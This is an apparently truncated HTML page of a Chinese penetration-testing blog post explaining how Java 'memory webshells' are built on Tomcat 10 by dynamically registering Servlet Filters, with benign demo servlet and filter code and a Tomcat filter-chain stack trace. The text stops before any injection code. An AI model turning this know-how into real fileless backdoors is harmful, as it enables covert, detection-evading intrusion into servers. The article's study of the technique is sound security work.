@@ -1,0 +1,3315 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <!-- title -->
+
+
+    
+
+<!-- keywords -->
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="lzwgiter">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="lzwgiter">
+    
+        <meta name="keywords" content="lzwgiter,float311,float's blog">
+    
+    <meta name="description" content="blogs from f10@t">
+    <meta name="description" content="本篇主要学习针对Java容器的内存马技术，即无文件webshell，由于这些容器运行在内存中，因而也难以检测。Java容器的内存马大体上可以分为：  Servlet型 Instrument型  本篇具体内容为Tomcat容器下的Servlet型中的Filter内存马原理和利用方法，另外两个类型原理和Filter类似。Tomcat版本为10。（关于Servlet）。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java内存马原理（一）">
+<meta property="og:url" content="https://lzwgiter.github.io/posts/c16d1cd9.html">
+<meta property="og:site_name" content="f10@t&#39;s blog">
+<meta property="og:description" content="本篇主要学习针对Java容器的内存马技术，即无文件webshell，由于这些容器运行在内存中，因而也难以检测。Java容器的内存马大体上可以分为：  Servlet型 Instrument型  本篇具体内容为Tomcat容器下的Servlet型中的Filter内存马原理和利用方法，另外两个类型原理和Filter类似。Tomcat版本为10。（关于Servlet）。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://lzwgiter.github.io/img/Java%E5%86%85%E5%AD%98%E9%A9%AC%E5%8E%9F%E7%90%86%EF%BC%88%E4%B8%80%EF%BC%89/e38ce0bab38f1b8757931db3f5dd7a8b.jpeg">
+<meta property="og:image" content="https://lzwgiter.github.io/img/Java%E5%86%85%E5%AD%98%E9%A9%AC%E5%8E%9F%E7%90%86%EF%BC%88%E4%B8%80%EF%BC%89/image-20230808143107888.png">
+<meta property="og:image" content="https://lzwgiter.github.io/img/Java%E5%86%85%E5%AD%98%E9%A9%AC%E5%8E%9F%E7%90%86%EF%BC%88%E4%B8%80%EF%BC%89/image-20230808144820744.png">
+<meta property="og:image" content="https://lzwgiter.github.io/img/Java%E5%86%85%E5%AD%98%E9%A9%AC%E5%8E%9F%E7%90%86%EF%BC%88%E4%B8%80%EF%BC%89/image-20230808165211119.png">
+<meta property="article:published_time" content="2023-08-08T08:05:17.000Z">
+<meta property="article:modified_time" content="2023-08-09T01:42:44.230Z">
+<meta property="article:author" content="lzwgiter">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="web安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://lzwgiter.github.io/img/Java%E5%86%85%E5%AD%98%E9%A9%AC%E5%8E%9F%E7%90%86%EF%BC%88%E4%B8%80%EF%BC%89/e38ce0bab38f1b8757931db3f5dd7a8b.jpeg">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/assets/hello.svg">
+    
+    <title>Java内存马原理（一） · float&#39;s blog</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20211217" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="/css/dark.css?v=20211217" as="style">
+    <link rel="stylesheet" href="/css/dark.css">
+    <link rel="stylesheet" href="/css/mobile.css?v=20211217" media="(max-width: 960px)">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js?v=20211217" as="script">
+    <link rel="preload" href="/scripts/dark.js?v=20211217" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <!-- algolia -->
+    
+    <!-- 百度统计  -->
+    
+        <script>
+            var _hmt = _hmt || [];
+            (function () {
+                var hm = document.createElement("script");
+                hm.src = "https://hm.baidu.com/hm.js?9ef67111f9ae4eefa278780655f0c1e3";
+                var s = document.getElementsByTagName("script")[0];
+                s.parentNode.insertBefore(hm, s);
+            })();
+        </script>
+    
+    <!-- 谷歌统计  -->
+    
+        <script>
+            (function (i, s, o, g, r, a, m) {
+                i['GoogleAnalyticsObject'] = r; i[r] = i[r] || function () {
+                (i[r].q = i[r].q || []).push(arguments)
+                }, i[r].l = 1 * new Date(); a = s.createElement(o),
+                m = s.getElementsByTagName(o)[0]; a.async = 1; a.src = g; m.parentNode.insertBefore(a, m)
+            })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');
+            ga('create', 'G-8DFDYFMQP8', 'auto');
+            ga('send', 'pageview');
+        </script>
+    
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="f10@t's blog" type="application/atom+xml">
+</head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+    
+        <body class="post-body">
+    
+        <!-- header -->
+        <header class="header header-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress read-progress-feature"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        
+            <div class="header-sidebar-menu header-sidebar-menu-rounded">
+        
+            
+                <i class="fas fa-bars"></i>
+            
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href=/>float's blog</a>
+        </span>
+    </div>
+    <!-- toggle banner for post layout -->
+    
+        
+            <div class="banner">
+        
+            <div class="blog-title header-element">
+                <a href="/">float&#39;s blog</a>
+            </div>
+            <div class="post-title header-element">
+                <a href="#" class="post-name">Java内存马原理（一）</a>
+            </div>
+        </div>
+    
+</header>
+
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- back to top button -->
+    <div class="footer-fixed-element">
+        
+            <div class="back-top back-top-hidden back-top-rounded">
+        
+        
+            <i class="fas fa-chevron-up"></i>
+        
+        </div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="
+
+
+
+
+
+
+
+    height:50vh;
+
+">
+    
+    <!-- 主页  -->
+    
+        
+    <!-- 404页  -->
+    
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+                Java内存马原理（一）
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+                
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页 meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        
+        
+            
+        
+        
+        <span class="post-category" data-categories="渗透测试"">
+            <i class="fas fa-folder post-category-icon"></i>
+            <span class="post-category-text">
+                渗透测试
+            </span>
+        </span>
+    
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="渗透测试">渗透测试</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="web安全">web安全</a>
+    
+</div>
+
+                
+                <!-- 文章字数统计 -->
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">3.6k</span>阅读时长: <span class="post-count reading-time">15 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2023/08/08</span>
+                    <!-- busuanzi -->
+                    
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
+        <blockquote>
+<p>本篇主要学习针对Java容器的内存马技术，即无文件webshell，由于这些容器运行在内存中，因而也难以检测。Java容器的内存马大体上可以分为：</p>
+<ul>
+<li>Servlet型</li>
+<li>Instrument型</li>
+</ul>
+<p>本篇具体内容为Tomcat容器下的Servlet型中的Filter内存马原理和利用方法，另外两个类型原理和Filter类似。Tomcat版本为10。（关于<a
+href="https://lzwgiter.github.io/posts/b92dbb83.html">Servlet</a>）。</p>
+<p><img src="/img/Java内存马原理（一）/e38ce0bab38f1b8757931db3f5dd7a8b.jpeg" style="zoom:70%;" /></p>
+</blockquote>
+<span id="more"></span>
+<h1 id="什么是无文件webshell">什么是无文件webshell？</h1>
+<p>随着流量分析、EDR等技术的逐步发展，传统的比如文件上传绕过检测来投放<strong>文件型webshell</strong>的手段已经不大行了，比如我们常见的一句话木马配合菜刀、冰蝎等，这些都需要将<code>.php</code>、<code>.jsp</code>等这种<strong>后门文件</strong>上传到目标机器上。然而在机器学习技术的加持下，这类文件的检测已经非常容易了，因此出现了<strong>无文件webeshell</strong>的需求。</p>
+<p>其核心原理：</p>
+<blockquote>
+<p>利用类加载或Agent机制在JavaEE、框架或中间件的API中动态注册一个可访问的后门</p>
+</blockquote>
+<p>无论是传统的Tomcat还是现行的Spring，他们底层上对用户请求的接收和处理，都会使用到<strong>Servlet技术</strong>，这是Java
+Web的根。Servlet技术为我们提供了一些经典的组件——换言之即<strong>利用方式</strong>：<strong>Servlet、Filter、Listener</strong>。</p>
+<p>因而Java无文件webshell攻击的分类，也就可以从两个技术角度去分类（抛开框架）：</p>
+<ul>
+<li>基于Servlet or Filter or Listener。动态地创建上述对象并RCE；</li>
+<li>利用Java的Instrument机制，动态注入Agent，在Java内存中动态修改字节码实现RCE；</li>
+</ul>
+<p>思想上无文件webshell其实我个人理解与传统的代码注入攻击是相似的。后者通过提前准备数据、创建remote线程、操作合法进程内存空间并执行恶意代码来实现。这个过程在内存中发生，我们的目的就是<strong>在一个合法进程中执行恶意代码</strong>。</p>
+<p>反观无文件webshell是类似的，我们同样要<strong>进入</strong>一个用户请求的处理流程（一般为线程处理）、让这个流程中“动态的”插入我们的恶意代码并执行、并通过网络请求参数等办法操纵。整个过程和代码注入是很相似的。</p>
+<p>下面以Tomcat 10.1.11为例子讨论一下攻击原理和利用手段。</p>
+<h1 id="关于servlet">关于Servlet</h1>
+<p>更多关于Servlet的开发细节可以移步我的文章：<a
+href="https://lzwgiter.github.io/posts/b92dbb83.html">JavaEE基础 -
+Servlet · float's blog (lzwgiter.github.io)</a></p>
+<p>Servlet的角色和流程如下：</p>
+<p><img
+src="/img/Java内存马原理（一）/image-20230504144857382.png" /></p>
+<p>Servlet作为客户端和业务逻辑的中间层，接受客户端请求<code>HttpServletRequest</code>、<code>init()</code>创建一个servlet并执行<code>service()</code>的代码逻辑，最后<code>destroy()</code>销毁。其中service根据客户端不同的HTTP方法，对应有<code>doGet()</code>、<code>doPost()</code>、<code>doPut()</code>等方法。</p>
+<p>定义一个Servlet的方法是继承<code>javax.servlet.http.HttpServlet</code>并覆写其中的对应的HTTP方法即可。</p>
+<p>Servlet
+3.0开始新增了对注解的支持，我们可以使用如<code>@webServlet</code>、<code>@webFilter</code>、<code>@WebListener</code>等注解<strong>静态</strong>地编写对应的<code>Servlet</code>、<code>Filter</code>、<code>Listener</code>。</p>
+<p>此外，我们也可以使用<code>addServlet</code>、<code>addFilter</code>、<code>addListener</code>注解<strong>动态地</strong>添加新的<code>Servlet</code>、<code>Filter</code>、<code>Listener</code>。</p>
+<p><strong>也正是这一动态加载的手段为我们的利用留下了可能性。</strong>具体来说，tomcat（版本10）中，这三个组件都是由<code>jakarta.servlet.ServletContext</code>接口来加载的，具体实现类为<code>org.apache.catalina.core.ApplicationContextFacade</code>：</p>
+<p><img
+src="/img/Java内存马原理（一）/image-20230504153747060.png" /></p>
+<p>而该接口中就定义了对应的方法来实现动态的注册：</p>
+<blockquote>
+<p>能基于这玩意儿的原因是因为从Servlet
+3.0开始他们提供了动态创建Servlet、Filter、Listener的方法，我也不知道这个的需求来自什么。。。</p>
+</blockquote>
+<p><img
+src="/img/Java内存马原理（一）/image-20230808140435910.png" /></p>
+<p>插一嘴，这里从具体实现类的名字后缀可以看出使用了设计模式中的<strong>外观模式（Facede）</strong>，即将一个黑盒子进一步的包装提供接口以简化使用。后面代码调试中就可以看到其实际指向的是一个<code>org.apache.catalina.core.Application</code>类：</p>
+<p><img
+src="/img/Java内存马原理（一）/image-20230808144526970.png" /></p>
+<p>我们先写一个简单的servlet：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> f10at.webshell.web.servletdemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(value = &quot;/hello&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        out.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;h1&gt;Hello&lt;/h1&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>启动后访问对应的path： <img
+src="/img/Java内存马原理（一）/image-20230808140003166.png" /></p>
+<h1 id="基于filter">基于Filter</h1>
+<p>过滤器的作用主要是<strong>动态地拦截请求和响应，以变化或使用在请求或响应中地信息</strong>，可以实现以下目的：</p>
+<ul>
+<li>在客户端的请求访问后端资源之前，拦截这些请求。</li>
+<li>在服务器的响应发送到客户端之前，处理这些响应。</li>
+</ul>
+<p>常见的由以下作用类型的过滤器：</p>
+<ul>
+<li>身份验证过滤器（Authentication Filters）。</li>
+<li>数据压缩过滤器（Data compression Filters）。</li>
+<li>加密过滤器（Encryption Filters）。</li>
+<li>触发资源访问事件过滤器。</li>
+<li>图像转换过滤器（Image Conversion Filters）。</li>
+<li>日志记录和审核过滤器（Logging and Auditing Filters）。</li>
+<li>MIME-TYPE 链过滤器（MIME-TYPE Chain Filters）。</li>
+<li>标记化过滤器（Tokenizing Filters）。</li>
+<li>XSL/T 过滤器（XSL/T Filters），转换 XML 内容。</li>
+</ul>
+<p>过滤器类的编写主要是实现了<code>javax.servlet.Filter</code>接口，我们先写一个简单的Filter过滤器，并调试一下看看Tomcat是如何将它注册的。一个简单的Filter如下:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> f10at.webshell.web.servletdemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.*;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.annotation.WebFilter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lzwgiter</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@email</span> float311@163.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2023/8/8</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@WebFilter(value = &quot;/hello&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Filter here!&quot;</span>);</span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>启动项目访问对应接口后，我们可以看到过滤器的效果：</p>
+<p><img
+src="/img/Java内存马原理（一）/image-20230808141103263.png" /></p>
+<h2 id="filterchain注册过程">FilterChain注册过程</h2>
+<p>在doFilter中增加断点，查看一下调用链：</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">doFilter:17, MyFilter (f10at.webshell.web.servletdemo)</span><br><span class="line">internalDoFilter:174, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:149, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">invoke:166, StandardWrapperValve (org.apache.catalina.core)</span><br><span class="line">invoke:90, StandardContextValve (org.apache.catalina.core)</span><br><span class="line">invoke:482, AuthenticatorBase (org.apache.catalina.authenticator)</span><br><span class="line">invoke:115, StandardHostValve (org.apache.catalina.core)</span><br><span class="line">invoke:93, ErrorReportValve (org.apache.catalina.valves)</span><br><span class="line">invoke:676, AbstractAccessLogValve (org.apache.catalina.valves)</span><br><span class="line">invoke:74, StandardEngineValve (org.apache.catalina.core)</span><br><span class="line">service:341, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">service:391, Http11Processor (org.apache.coyote.http11)</span><br><span class="line">process:63, AbstractProcessorLight (org.apache.coyote)</span><br><span class="line">process:894, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br><span class="line">doRun:1740, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">run:52, SocketProcessorBase (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:1191, ThreadPoolExecutor (org.apache.tomcat.util.threads)</span><br><span class="line">run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)</span><br><span class="line">run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:834, Thread (java.lang)</span><br></pre></td></tr></table></figure>
+<p>可以看到，在<code>ApplicationFilterChain</code>这个类的174行调用了<code>internalDoFilter</code>方法，在该方法中调用了filter的doFilter方法从而来到我们的代码中：</p>
+<p><img
+src="/img/Java内存马原理（一）/image-20230808142920344.png" /></p>
+<p>而这个filterChain则是由<code>ApplicationFilterFactory</code>这个工厂类创建的：
+<img src="/img/Java内存马原理（一）/image-20230808143107888.png" /></p>
+<p>从文档中可以看出，该类中注册了所有的Filter，依次调用功能<code>doFilter</code>方法并传递请求和响应对象以触发下一个Filter的调用，最终到达service方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Implementation of jakarta.servlet.FilterChain used to manage the execution of a set of filters for a   </span></span><br><span class="line"><span class="comment"> * particular request. When the set of defined filters has all been executed, the next call to doFilter() will </span></span><br><span class="line"><span class="comment"> * execute the servlet&#x27;s service() method itself.</span></span><br><span class="line"><span class="comment"> * Author:</span></span><br><span class="line"><span class="comment"> * Craig R. McClanahan</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>
+<p>我们进一步查看一下<code>createFilterChain</code>方法内容，大致上可以分为两部分：</p>
+<ul>
+<li>新建ApplicationFilterChain对象</li>
+<li>遍历FilterMap[]，添加符合客户端请求的Filter到过滤链中</li>
+</ul>
+<p><img
+src="/img/Java内存马原理（一）/image-20230808163641014.png" /></p>
+<p>从文档中可以看出，该方法构造了一个<code>FilterChain</code>接口的实例，其中包含了参数<code>servlet</code>对应的所有的Filter。</p>
+<blockquote>
+<p>代码中@WebFilter的value属性就在后面发挥了作用</p>
+</blockquote>
+<p><img
